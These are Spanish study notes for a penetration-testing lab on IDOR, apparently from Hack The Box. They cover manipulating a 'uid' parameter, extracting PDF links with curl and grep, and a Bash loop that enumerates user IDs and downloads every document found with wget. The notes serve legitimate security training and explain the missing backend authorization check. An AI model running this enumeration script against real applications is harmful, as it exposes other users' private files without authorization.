
## 1. Identificar parámetros inseguros

Una vulnerabilidad IDOR aparece cuando podemos modificar una referencia directa a un objeto y acceder a recursos sin que el backend compruebe correctamente nuestros permisos.

En el laboratorio utilizamos una aplicación de administración de empleados que muestra sus documentos mediante:

```
GET /documents.php?uid=1 HTTP/1.1
Host: SERVER_IP:PORT
```

El parámetro `uid` determina los documentos que se muestran.

### IDOR de archivos estáticos

Los archivos pueden seguir patrones predecibles, por ejemplo:

```
/documents/Invoice_1_09_2021.pdf
/documents/Report_1_10_2021.pdf
```

En este caso, los nombres incluyen el identificador del usuario, el tipo de documento y una fecha.

Podemos intentar localizar archivos de otros usuarios modificando los identificadores o probando nombres siguiendo el mismo patrón.

Sin embargo, esta técnica depende de conocer los posibles nombres y formatos de los archivos.

### IDOR mediante parámetros GET

Podemos modificar el parámetro `uid`:

```
/documents.php?uid=1
/documents.php?uid=2
/documents.php?uid=3
```

Aunque la página parezca mostrar el mismo contenido, debemos comprobar los enlaces y los datos devueltos.

Por ejemplo, al cambiar a `uid=2`, los documentos pueden pasar a ser:

```
/documents/Invoice_2_08_2020.pdf
/documents/Report_2_12_2020.pdf
```

Esto demuestra que el parámetro controla qué documentos se muestran.

**Concepto clave:** el backend debe verificar que el usuario autenticado tiene permiso para consultar los documentos del `uid` solicitado.

## 2. Extraer enlaces de documentos con curl y grep

Una vez identificada la vulnerabilidad, podemos automatizar la extracción de enlaces.

### Paso 1: Obtener el HTML

```
curl -s "http://SERVER_IP:PORT/documents.php?uid=3" | grep "<li class='pure-tree_link'>"
```

La respuesta puede contener enlaces como:

```
<li class='pure-tree_link'><a href='/documents/Invoice_3_06_2020.pdf' target='_blank'>Invoice</a></li>
<li class='pure-tree_link'><a href='/documents/Report_3_01_2020.pdf' target='_blank'>Report</a></li>
```

### Paso 2: Extraer únicamente las rutas

Podemos utilizar `grep -oP` con una expresión regular:

```
curl -s "http://SERVER_IP:PORT/documents.php?uid=3" | grep -oP "/documents.*?\.pdf"
```

Resultado:

```
/documents/Invoice_3_06_2020.pdf
/documents/Report_3_01_2020.pdf
```

**Parámetros importantes:**

|Parámetro|Función|
|---|---|
|`curl -s`|Realiza la petición HTTP sin mostrar la barra de progreso.|
|`grep`|Filtra las líneas que coinciden con un patrón.|
|`-o`|Muestra únicamente las partes que coinciden.|
|`-P`|Permite utilizar expresiones regulares compatibles con Perl.|
|`.*?`|Busca el contenido coincidente de forma no codiciosa.|
|`\.pdf`|Busca la extensión literal `.pdf`.|

## 3. Enumeración masiva con Bash

Podemos automatizar la enumeración de varios usuarios y descargar los documentos encontrados.

> Ejecutar únicamente en el laboratorio autorizado de HTB.

```
#!/bin/bash

url="http://SERVER_IP:PORT"

for i in {1..10}; do
    for link in $(curl -s "$url/documents.php?uid=$i" | grep -oP "/documents.*?\.pdf"); do
        wget -q "$url$link"
    done
done
```

### Cómo funciona

1. `url` almacena la dirección de la aplicación.
    
2. El primer bucle recorre los identificadores del `1` al `10`.
    
3. `curl` consulta los documentos correspondientes a cada usuario.
    
4. `grep -oP` extrae las rutas de los archivos PDF.
    
5. El segundo bucle recorre cada enlace encontrado.
    
6. `wget -q` descarga cada documento.
    

### Personalización

Cambiar:

```
url="http://SERVER_IP:PORT"
```

por la dirección del objetivo del laboratorio.

El rango:

```
for i in {1..10}; do
```

determina los identificadores que se prueban.

**Importante:** este script es un ejemplo básico. Depende de que los identificadores sean secuenciales, de que los documentos sigan ese formato y de que la aplicación devuelva las rutas esperadas.

## 4. Otras herramientas de enumeración

También podemos utilizar:

- **Burp Suite Intruder:** automatizar peticiones modificando el parámetro `uid`.
    
- **OWASP ZAP Fuzzer:** probar múltiples valores y comparar las respuestas.
    
- **Bash o PowerShell:** automatizar la extracción de referencias y documentos.
    

Estas herramientas facilitan la enumeración cuando existen muchos usuarios o recursos.

## 5. Metodología para HTB

1. Identificar parámetros como `uid`, `user_id` o `file_id`.
    
2. Modificar manualmente el identificador y comparar las respuestas.
    
3. Inspeccionar los enlaces HTML para detectar referencias a archivos.
    
4. Identificar patrones predecibles en los nombres de los recursos.
    
5. Extraer las rutas con `curl` y `grep`.
    
6. Automatizar la comprobación de identificadores.
    
7. Verificar si se accede a recursos que pertenecen a otros usuarios.
    

## Chuleta rápida

|Objetivo|Comando|
|---|---|
|Consultar documentos de un usuario|`curl -s "http://SERVER_IP:PORT/documents.php?uid=3"`|
|Filtrar enlaces del HTML|`grep "<li class='pure-tree_link'>"`|
|Extraer rutas PDF|`grep -oP "/documents.*?\.pdf"`|
|Descargar un archivo|`wget -q "http://SERVER_IP:PORT/documents/archivo.pdf"`|
|Automatizar la enumeración|Bucle `for` sobre los identificadores `uid`.|

### Concepto clave para el examen

**La enumeración masiva de IDOR consiste en automatizar la búsqueda de referencias válidas para acceder a recursos que deberían estar protegidos.**

La vulnerabilidad existe por la falta de autorización adecuada en el backend, no por el simple hecho de que los identificadores sean predecibles.
